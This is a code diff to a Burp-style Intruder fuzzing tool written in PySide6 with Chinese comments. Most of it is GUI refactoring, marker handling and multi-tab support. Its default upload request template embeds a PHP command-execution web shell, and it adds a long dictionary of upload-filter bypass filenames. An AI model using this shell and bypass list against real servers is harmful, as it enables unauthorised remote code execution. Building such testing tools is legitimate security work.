@@ -14,7 +14,8 @@ from PySide6.QtWidgets import (
     QPushButton, QComboBox, QLabel, QTableWidget, QTableWidgetItem,
     QHeaderView, QSplitter, QGroupBox, QProgressBar, QSpinBox,
     QCheckBox, QTabWidget, QFileDialog, QMessageBox, QPlainTextEdit,
-    QApplication, QFrame, QSizePolicy, QProxyStyle, QStyle
+    QApplication, QFrame, QSizePolicy, QProxyStyle, QStyle, QTabBar,
+    QStackedWidget, QInputDialog
 )
 from PySide6.QtCore import Qt, Signal, QThread
 from PySide6.QtGui import QColor, QFont, QTextCursor
@@ -113,7 +114,7 @@ class IntruderWorker(QThread):
         positions = self._get_payload_positions(url, headers, body)
         
         if not positions:
-            self.error_signal.emit("未找到payload位置，请使用 $ $ 标记")
+            self.error_signal.emit("未找到payload位置，请使用 § § 标记")
             return
         
         requests = self._generate_requests(url, headers, body, positions)
@@ -146,7 +147,7 @@ class IntruderWorker(QThread):
     
     def _get_payload_positions(self, url: str, headers: dict, body: str) -> List[Tuple[str, int, int]]:
         positions = []
-        marker = '$'
+        marker = '§' 
         
         idx = 0
         while True:
@@ -230,27 +231,25 @@ class IntruderWorker(QThread):
         return requests
     
     def _create_request(self, url: str, headers: dict, body: str,
-                       positions: List[Tuple[str, int, int]], 
+                       positions: List[Tuple[str, int, int]],
                        target_idx: int, payload: str) -> dict:
         new_url = url
         new_body = body
-        
-        pos_type, start, end = positions[target_idx]
-        
-        if pos_type == 'url':
-            new_url = url[:start] + payload + url[end:]
-            for i, (pt, s, e) in enumerate(positions):
-                if i != target_idx and pt == 'url':
-                    new_url = new_url.replace('$', '')
-        else:
-            new_body = body[:start] + payload + body[end:]
-            for i, (pt, s, e) in enumerate(positions):
-                if i != target_idx and pt == 'body':
-                    new_body = new_body.replace('$', '')
-        
-        new_url = new_url.replace('$', '')
-        new_body = new_body.replace('$', '')
-        
+
+        # Process all positions in reverse order to avoid index corruption.
+        # Target position is replaced with payload; other positions are removed (empty string).
+        all_positions = sorted(
+            [(i, pos_type, start, end) for i, (pos_type, start, end) in enumerate(positions)],
+            key=lambda x: x[2], reverse=True
+        )
+
+        for i, pos_type, start, end in all_positions:
+            replacement = payload if i == target_idx else ''
+            if pos_type == 'url':
+                new_url = new_url[:start] + replacement + new_url[end:]
+            else:
+                new_body = new_body[:start] + replacement + new_body[end:]
+
         return {'url': new_url, 'headers': headers, 'body': new_body}
     
     def _create_request_all_positions(self, url: str, headers: dict, body: str,
@@ -265,27 +264,31 @@ class IntruderWorker(QThread):
             else:
                 new_body = new_body[:start] + payload + new_body[end:]
         
-        new_url = new_url.replace('$', '')
-        new_body = new_body.replace('$', '')
+        new_url = new_url.replace('§', '')
+        new_body = new_body.replace('§', '')
         
         return {'url': new_url, 'headers': headers, 'body': new_body}
     
     def _create_request_pitchfork(self, url: str, headers: dict, body: str,
-                                  positions: List[Tuple[str, int, int]], 
+                                  positions: List[Tuple[str, int, int]],
                                   payloads: List[str]) -> dict:
         new_url = url
         new_body = body
-        
-        for i, (pos_type, start, end) in enumerate(positions):
-            if i < len(payloads):
-                if pos_type == 'url':
-                    new_url = new_url[:start] + payloads[i] + new_url[end:]
-                else:
-                    new_body = new_body[:start] + payloads[i] + new_body[end:]
-        
-        new_url = new_url.replace('$', '')
-        new_body = new_body.replace('$', '')
-        
+
+        # Pair each position with its payload and sort by start index descending
+        # to avoid index corruption when string lengths change after each replacement.
+        paired = sorted(
+            [(pos_type, start, end, payloads[i] if i < len(payloads) else '')
+             for i, (pos_type, start, end) in enumerate(positions)],
+            key=lambda x: x[1], reverse=True
+        )
+
+        for pos_type, start, end, payload in paired:
+            if pos_type == 'url':
+                new_url = new_url[:start] + payload + new_url[end:]
+            else:
+                new_body = new_body[:start] + payload + new_body[end:]
+
         return {'url': new_url, 'headers': headers, 'body': new_body}
     
     async def _send_single_request(self, method: str, req_data: dict) -> dict:
@@ -348,11 +351,12 @@ class IntruderWorker(QThread):
             }
 
 
-class IntruderWidget(QWidget):
-    """Intruder主界面"""
+class IntruderTab(QWidget):
+    """单个Intruder标签页"""
     
-    def __init__(self):
+    def __init__(self, tab_name: str = "Intruder"):
         super().__init__()
+        self.tab_name = tab_name
         self.worker = None
         self.payload_sets = [[]]
         self.current_mode = "sniper"
@@ -399,7 +403,7 @@ class IntruderWidget(QWidget):
         
         top_layout.addStretch()
         
-        self.mark_btn = QPushButton("标记 $")
+        self.mark_btn = QPushButton("标记 §")
         self.mark_btn.setFixedWidth(80)
         self.mark_btn.setStyleSheet(f"""
             QPushButton {{
@@ -417,7 +421,7 @@ class IntruderWidget(QWidget):
         self.mark_btn.clicked.connect(self._mark_position)
         top_layout.addWidget(self.mark_btn)
         
-        self.clear_mark_btn = QPushButton("清除 $")
+        self.clear_mark_btn = QPushButton("清除 §")
         self.clear_mark_btn.setFixedWidth(80)
         self.clear_mark_btn.setStyleSheet(f"""
             QPushButton {{
@@ -455,7 +459,7 @@ class IntruderWidget(QWidget):
         left_layout.setSpacing(10)
         
         # 请求编辑区域
-        req_group = QGroupBox("请求模板 ($标记位置)")
+        req_group = QGroupBox("请求模板 (§标记位置)")
         req_group.setStyleSheet(f"""
             QGroupBox {{
                 font-weight: bold;
@@ -481,7 +485,7 @@ class IntruderWidget(QWidget):
             "Host: example.com\n"
             "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n"
             "------WebKitFormBoundary\n"
-            'Content-Disposition: form-data; name=\"file\"; filename=\"$shell.php$\"\n\n'
+            'Content-Disposition: form-data; name="file"; filename="§shell.php§"\n\n'
             "<?php system($_GET['cmd']); ?>"
         )
         self.req_edit.setMinimumHeight(200)
@@ -725,7 +729,7 @@ class IntruderWidget(QWidget):
         
         self.results_table = QTableWidget()
         self.results_table.setColumnCount(5)
-        self.results_table.setHorizontalHeaderLabels(["#", "Payload", "状态码", "长度", "错误"])
+        self.results_table.setHorizontalHeaderLabels(["#", "Payload", "状态码", "响应字节", "错误"])
         self.results_table.setColumnWidth(0, 50)
         self.results_table.setColumnWidth(2, 70)
         self.results_table.setColumnWidth(3, 70)
@@ -799,7 +803,7 @@ class IntruderWidget(QWidget):
         info_h_layout.setSpacing(15)
         
         self.detail_status = QLabel("")
-        self.detail_status.setStyleSheet(f"color: {COLORS['text_primary']}; font-weight: bold;")
+        self.detail_status.setStyleSheet(f"color: {COLORS['warning']}; font-weight: bold;")
         info_h_layout.addWidget(self.detail_status)
         
         self.detail_length = QLabel("")
@@ -815,11 +819,40 @@ class IntruderWidget(QWidget):
         
         # 请求/响应Tab
         self.detail_tabs = QTabWidget()
+        # 【新增】应用暗色主题到 TabWidget
+        self.detail_tabs.setStyleSheet(f"""
+            QTabWidget::pane {{
+                border: 1px solid {COLORS['border']};
+                background-color: {COLORS['bg_secondary']};
+            }}
+            QTabBar::tab {{
+                background-color: {COLORS['bg_tertiary']};
+                color: {COLORS['text_primary']};
+                border: 1px solid {COLORS['border']};
+                padding: 8px 16px;
+                margin-right: 2px;
+            }}
+            QTabBar::tab:selected {{
+                background-color: {COLORS['accent']};
+                color: white;
+            }}
+            QTabBar::tab:hover {{
+                background-color: {COLORS['border']};
+            }}
+        """)
         
         # 请求Tab
         self.request_text = QPlainTextEdit()
         self.request_text.setReadOnly(True)
         self.request_text.setFont(QFont("Consolas", 10))
+        # 【新增】应用暗色主题
+        self.request_text.setStyleSheet(f"""
+            QPlainTextEdit {{
+                background-color: {COLORS['bg_secondary']};
+                border: 1px solid {COLORS['border']};
+                selection-background-color: {COLORS['accent']};
+            }}
+        """)
         self.request_text.setPlaceholderText("点击结果查看请求...")
         self.highlighter_request = HTTPHighlighter(self.request_text.document(), is_request=True)
         self.detail_tabs.addTab(self.request_text, "请求")
@@ -831,6 +864,9 @@ class IntruderWidget(QWidget):
             self.detail_tabs.addTab(self.response_viewer, "响应")
             # 保留引用用于兼容
             self.response_text = self.response_viewer.raw_view
+            
+            # 【修复】当切换到响应选项卡时，强制刷新 Render 视图
+            self.detail_tabs.currentChanged.connect(self._on_detail_tab_changed)
         except ImportError:
             # 回退到纯文本视图
             self.response_text = QPlainTextEdit()
@@ -866,17 +902,23 @@ class IntruderWidget(QWidget):
         modes = ["sniper", "battering_ram", "pitchfork", "cluster_bomb"]
         if 0 <= index < len(modes):
             self.current_mode = modes[index]
-            print(f"攻击模式已切换为: {self.current_mode}")
     
     def _mark_position(self):
         cursor = self.req_edit.textCursor()
         if cursor.hasSelection():
+            # 如果有选中文本，用标记符包围
             selected = cursor.selectedText()
-            cursor.insertText(f"${selected}$")
+            cursor.insertText(f"§{selected}§")
+        else:
+            # 如果没有选中文本，在当前位置插入标记符
+            cursor.insertText("§§")
+            # 将光标移动到两个标记符中间
+            cursor.movePosition(QTextCursor.Left)
+            self.req_edit.setTextCursor(cursor)
     
     def _clear_marks(self):
         text = self.req_edit.toPlainText()
-        self.req_edit.setPlainText(text.replace('$', ''))
+        self.req_edit.setPlainText(text.replace('§', ''))
     
     def _add_payload_set(self):
         self.payload_sets.append([])
@@ -886,6 +928,22 @@ class IntruderWidget(QWidget):
     def _on_payload_set_changed(self, index):
         if 0 <= index < len(self.payload_sets):
             self.payload_input.setPlainText('\n'.join(self.payload_sets[index]))
+    
+    def _on_detail_tab_changed(self, index: int):
+        """当切换到响应选项卡时，强制刷新 Render 视图"""
+        # 响应Tab的索引是1（请求Tab是0）
+        if index == 1 and hasattr(self, 'response_viewer'):
+            # 延迟一点刷新，确保 Tab 已完全显示
+            from PySide6.QtCore import QTimer
+            QTimer.singleShot(50, lambda: self._refresh_render_view())
+    
+    def _refresh_render_view(self):
+        """强制刷新 Render 视图"""
+        if hasattr(self, 'response_viewer'):
+            try:
+                self.response_viewer._update_render_view()
+            except Exception:
+                pass
     
     def _clear_payloads(self):
         self.payload_input.clear()
@@ -907,12 +965,60 @@ class IntruderWidget(QWidget):
                 QMessageBox.critical(self, "错误", f"加载失败: {str(e)}")
     
     def _load_bypass_dict(self):
+        # 【更新】扩展bypass字典
         bypass_payloads = [
-            "shell.php", "shell.php.", "shell.php%00.jpg", "shell.php;.jpg",
-            "shell.jpg.php", "shell.PHP", "shell.pHp", "shell.php5",
-            "shell.pht", "shell.phtml", "shell.phps", "shell.php.jpg",
-            "shell.php%00", "shell.php%0a", "shell.php%0d", "shell.php%20",
-            "shell.php::$DATA", "shell.asp;.jpg", "shell.jsp%00.jpg",
+            # 基础扩展名绕过
+            "shell.php", "shell.php.", "shell.php5", "shell.php4", "shell.php3", "shell.php2",
+            "shell.phtml", "shell.pht", "shell.phps", "shell.phar", "shell.php7", "shell.php8",
+            "shell.asp", "shell.asp", "shell.aspx", "shell.cer", "shell.cdi",
+            "shell.jsp", "shell.jspx", "shell.jsw", "shell.jsf", "shell.jhtml",
+            "shell.cshtml", "shell.cfm", "shell.htaccess",
+            "shell.jpg", "shell.png", "shell.gif", "shell.pdf", "shell.html", "shell.htm",
+            
+            # 【新增】双扩展名绕过
+            "shell.jpg.php", "shell.jpg.php5", "shell.jpg.phtml",
+            "shell.png.php", "shell.png.jsp",
+            "shell.gif.php", "shell.gif.aspx",
+            "shell.html.php", "shell.htm.php",
+            
+            # 【新增】点号填充
+            "shell.php.", "shell.php...", "shell.php....",
+            "shell.asp...", "shell.jsp....",
+            
+            # 【新增】空格和特殊字符
+            "shell.php ", "shell.php%20",
+            "shell.php%0a", "shell.php%0d", "shell.php%09", "shell.php%0a%0d",
+            "shell.php\x00.jpg", "shell.php\x00.png",
+            
+            # 【新增】大小写绕过
+            "shell.PHP", "shell.PhP", "shell.pHp", "shell.Php", "shell.pHP",
+            "shell.ASP", "shell.ASPX", "shell.JSP",
+            
+            # 【新增】Windows特性
+            "shell.php::$DATA", "shell.asp::$DATA", "shell.jsp::$DATA",
+            "shell.php:.jpg", "shell.asp:.jpg", "shell.jsp:.jpg",
+            "shell.php.", "shell.php.txt",
+            
+            # 【新增】00截断变体
+            "shell.php%00", "shell.php%00.jpg", "shell.php%00.png", "shell.php%00.gif",
+            "shell.php%0a", "shell.php%0a.jpg", "shell.php%0d.jpg",
+            "shell.php\x00.jpg", "shell.php\n.jpg",
+            
+            # 【新增】分号和点号混合
+            "shell.php;.jpg", "shell.php;.png", "shell.php;.gif",
+            "shell.asp;.jpg", "shell.jsp;.jpg",
+            
+            # 【新增】HTM绕过
+            "shell.htaccess", "shell.htaccess.jpg",
+            "shell.xhtml", "shell.xhtml.php",
+            
+            # 【新增】常见WebShell名称
+            "cmd.php", "backdoor.php", "webshell.php", "upload.php", "test.php", "shell.php",
+            "x.php", "a.php", "c.php", "l.php", "s.php", "z.php",
+            
+            # 【新增】MIME伪造扩展名（配合Content-Type绕过）
+            "shell.jpg", "shell.png", "shell.gif", "shell.bmp", "shell.webp",
+            "shell.jpeg", "shell.JPEG", "shell.Jpg",
         ]
         self.payload_input.setPlainText('\n'.join(bypass_payloads))
         idx = self.payload_set_combo.currentIndex()
@@ -920,7 +1026,7 @@ class IntruderWidget(QWidget):
             self.payload_sets[idx] = bypass_payloads
     
     def _parse_request(self, req_text: str):
-        lines = req_text.strip().split('\n')
+        lines = req_text.strip().splitlines()
         if not lines:
             return None, None, None, None
         
@@ -943,7 +1049,13 @@ class IntruderWidget(QWidget):
                 headers[key.strip()] = value.strip()
         
         body = '\n'.join(lines[body_start:]) if body_start > 0 else ''
-        
+
+        if url.startswith('/'):
+            host = headers.get('Host') or headers.get('host') or ''
+            host = host.strip()
+            if host:
+                scheme = 'http'
+                url = f"{scheme}://{host}{url}"
         return method, url, headers, body
     
     def _start_attack(self):
@@ -974,8 +1086,8 @@ class IntruderWidget(QWidget):
             QMessageBox.warning(self, "警告", "请求格式不正确")
             return
         
-        if '$' not in req_text:
-            QMessageBox.warning(self, "警告", "请使用 $ $ 标记payload位置")
+        if '§' not in req_text:
+            QMessageBox.warning(self, "警告", "请使用 § § 标记payload位置")
             return
         
         self.results_table.setRowCount(0)
@@ -1088,15 +1200,41 @@ class IntruderWidget(QWidget):
                 request_str = result.get('request', '')
                 self.request_text.setPlainText(request_str)
                 
-                # 【新增】使用ResponseViewerWidget显示响应（支持Render视图）
+                # 【修复】使用ResponseViewerWidget显示响应（支持Render视图）
                 if hasattr(self, 'response_viewer'):
+                    # 【修复】从请求中提取URL信息
+                    url = ''
+                    request_str = result.get('request', '')
+                    if request_str:
+                        lines = request_str.split('\n')
+                        if lines and ' ' in lines[0]:
+                            parts = lines[0].split(' ')
+                            if len(parts) >= 2:
+                                url_path = parts[1]
+                                # 从请求头中提取Host
+                                for line in lines[1:]:
+                                    if line.lower().startswith('host:'):
+                                        host = line.split(':', 1)[1].strip()
+                                        if host:
+                                            # 构造完整URL - 【修复】正确判断 HTTPS
+                                            # 检查是否包含端口号，以及是否可能是 HTTPS
+                                            is_https = False
+                                            if ':' in host:
+                                                port = host.split(':')[-1]
+                                                is_https = port == '443'
+                                            scheme = 'https' if is_https else 'http'
+                                            url = f"{scheme}://{host}{url_path}"
+                                        break
+                    
                     # 使用ResponseViewerWidget显示完整响应
                     response_dict = {
                         'status_code': result.get('status_code', 0),
                         'headers': result.get('headers', ''),
                         'body': result.get('body', ''),
                         'body_bytes': result.get('body_bytes', b''),
-                        'url': ''  # 可以从request中提取URL
+                        'url': url,
+                        'time': 0.0,  # Intruder不记录时间
+                        'error': result.get('error', '')
                     }
                     self.response_viewer.set_response_from_dict(response_dict)
                 else:
@@ -1110,14 +1248,222 @@ class IntruderWidget(QWidget):
                 self.detail_text.setPlainText(result.get('body', ''))
     
     def load_request(self, request_data: dict):
-        if request_data:
-            method = request_data.get('method', 'GET')
-            url = request_data.get('url', '')
-            headers = request_data.get('request_headers', '')
-            body = request_data.get('request_body', '')
+        """加载请求到Intruder"""
+        method = request_data.get('method', 'GET')
+        url = request_data.get('url', '')
+        headers = request_data.get('request_headers', '')
+        body = request_data.get('request_body', '')
+        
+        # 构建请求模板
+        req_text = f"{method} {url} HTTP/1.1\n{headers}\n\n{body}"
+        self.req_edit.setPlainText(req_text)
+
+class IntruderWidget(QWidget):
+    """多标签页Intruder组件 (Burp-style)"""
+    
+    def __init__(self):
+        super().__init__()
+        self._tab_counter = 1
+        # 【修复】保存已关闭的 widget 引用，避免立即 deleteLater 导致崩溃
+        self._closed_tabs = []
+        self._init_ui()
+    
+    def _init_ui(self):
+        layout = QVBoxLayout(self)
+        layout.setContentsMargins(0, 0, 0, 0)
+        
+        # 工具栏
+        toolbar = QHBoxLayout()
+        
+        # 新建标签按钮
+        self.new_tab_btn = QPushButton("+ 新建标签")
+        self.new_tab_btn.setStyleSheet(f"background-color: {COLORS['success']}; color: white; font-weight: bold; padding: 5px 15px;")
+        self.new_tab_btn.clicked.connect(self._on_new_tab)
+        toolbar.addWidget(self.new_tab_btn)
+        
+        # 关闭标签按钮
+        self.close_tab_btn = QPushButton("关闭标签")
+        self.close_tab_btn.setStyleSheet(f"background-color: {COLORS['danger']}; color: white; padding: 5px 15px;")
+        self.close_tab_btn.clicked.connect(self._on_close_tab)
+        toolbar.addWidget(self.close_tab_btn)
+        
+        toolbar.addStretch()
+        layout.addLayout(toolbar)
+        
+        # 标签栏 - 设置紧凑样式
+        self.tab_bar = QTabBar()
+        self.tab_bar.setTabsClosable(True)
+        self.tab_bar.setMovable(True)
+        self.tab_bar.setExpanding(False)  # 【新增】不自动扩展，保持固定大小
+        self.tab_bar.setElideMode(Qt.ElideRight)  # 【新增】文本过长时省略
+        self.tab_bar.setStyleSheet("""
+            QTabBar::tab {
+                min-width: 80px;
+                max-width: 150px;
+                padding: 5px 10px;
+                margin-right: 2px;
+            }
+        """)
+        self.tab_bar.tabCloseRequested.connect(self._on_tab_close_requested)
+        self.tab_bar.currentChanged.connect(self._on_tab_changed)
+        self.tab_bar.tabBarDoubleClicked.connect(self._on_tab_rename)
+        layout.addWidget(self.tab_bar)
+        
+        # 内容区域
+        self.content_stack = QStackedWidget()
+        layout.addWidget(self.content_stack, stretch=1)
+        
+        # 创建默认标签
+        self._add_tab("Intruder 1")
+    
+    def _add_tab(self, name: str = None) -> int:
+        """添加新标签"""
+        if name is None:
+            name = f"Intruder {self._tab_counter}"
+        self._tab_counter += 1
+        
+        tab = IntruderTab(name)
+        index = self.content_stack.addWidget(tab)
+        tab_index = self.tab_bar.addTab(name)
+        
+        self.tab_bar.setCurrentIndex(tab_index)
+        return tab_index
+    
+    def _on_new_tab(self):
+        """新建标签"""
+        self._add_tab()
+    
+    def _on_close_tab(self):
+        """关闭当前标签"""
+        current = self.tab_bar.currentIndex()
+        if current >= 0:
+            self._on_tab_close_requested(current)
+    
+    def _on_tab_close_requested(self, index: int):
+        """关闭指定标签 - 【修复】应用 Repeater 相同的崩溃修复"""
+        if self.tab_bar.count() <= 1:
+            QMessageBox.information(self, "提示", "至少需要保留一个标签")
+            return
+        
+        try:
+            # index 合法性保护
+            if index < 0 or index >= self.content_stack.count():
+                return
             
-            req_text = f"{method} {url} HTTP/1.1\n"
-            req_text += f"{headers}\n\n"
-            req_text += body
+            # 获取 widget 并安全停止 worker
+            widget = self.content_stack.widget(index)
+            if widget and isinstance(widget, IntruderTab):
+                self._stop_tab_worker(widget)
             
-            self.req_edit.setPlainText(req_text)
+            # 阻断信号避免级联触发
+            from PySide6.QtCore import QSignalBlocker
+            blocker_tab = QSignalBlocker(self.tab_bar)
+            blocker_stack = QSignalBlocker(self.content_stack)
+            if widget:
+                try:
+                    widget.blockSignals(True)
+                except Exception:
+                    pass
+            
+            try:
+                if widget is not None:
+                    # 【关键修复】缓存 widget 而非立即 deleteLater
+                    widget.hide()
+                    widget.setParent(None)
+                    self._closed_tabs.append(widget)
+                    self.content_stack.removeWidget(widget)
+                    # 限制缓存数量
+                    if len(self._closed_tabs) > 20:
+                        old_widget = self._closed_tabs.pop(0)
+                        try:
+                            old_widget.deleteLater()
+                        except Exception:
+                            pass
+                
+                self.tab_bar.removeTab(index)
+            finally:
+                if widget:
+                    try:
+                        widget.blockSignals(False)
+                    except Exception:
+                        pass
+                del blocker_stack
+                del blocker_tab
+            
+            # 延迟修正 currentIndex
+            if self.tab_bar.count() > 0:
+                new_current = min(self.tab_bar.currentIndex(), self.tab_bar.count() - 1)
+                if new_current < 0:
+                    new_current = 0
+                from PySide6.QtCore import QTimer
+                QTimer.singleShot(50, lambda: self._safe_set_current(new_current))
+                
+        except Exception as e:
+            print(f"关闭 Intruder 标签时出错: {e}")
+            import traceback
+            traceback.print_exc()
+    
+    def _stop_tab_worker(self, tab: IntruderTab):
+        """安全停止 IntruderTab 的 worker"""
+        try:
+            worker = getattr(tab, 'worker', None)
+            if worker and worker.isRunning():
+                # 断开信号
+                try:
+                    worker.result_ready.disconnect(tab._on_result)
+                except Exception:
+                    pass
+                try:
+                    worker.finished_signal.disconnect(tab._on_finished)
+                except Exception:
+                    pass
+                try:
+                    worker.error_signal.disconnect(tab._on_error)
+                except Exception:
+                    pass
+                # 停止 worker
+                worker.stop()
+                tab.worker = None
+        except Exception:
+            pass
+    
+    def _safe_set_current(self, index: int):
+        """安全设置当前标签"""
+        try:
+            if 0 <= index < self.tab_bar.count():
+                self.tab_bar.setCurrentIndex(index)
+            if 0 <= index < self.content_stack.count():
+                self.content_stack.setCurrentIndex(index)
+        except Exception:
+            pass
+    
+    def _on_tab_changed(self, index: int):
+        """切换标签"""
+        if index >= 0:
+            self.content_stack.setCurrentIndex(index)
+    
+    def _on_tab_rename(self, index: int):
+        """重命名标签"""
+        current_name = self.tab_bar.tabText(index)
+        dialog = QInputDialog(self)
+        dialog.setWindowTitle("重命名标签")
+        dialog.setLabelText("请输入新名称:")
+        dialog.setTextValue(current_name)
+        dialog.resize(400, 150)
+        if dialog.exec() == QInputDialog.Accepted:
+            new_name = dialog.textValue()
+            if new_name:
+                self.tab_bar.setTabText(index, new_name)
+    
+    def load_request(self, request_data: dict, create_new_tab: bool = True):
+        """加载请求到Intruder - 默认创建新标签"""
+        if create_new_tab:
+            # 创建新标签并加载请求
+            tab_index = self._add_tab()
+            current_widget = self.content_stack.widget(tab_index)
+        else:
+            # 加载到当前标签（兼容旧行为）
+            current_widget = self.content_stack.currentWidget()
+        
+        if current_widget and isinstance(current_widget, IntruderTab):
+            current_widget.load_request(request_data)
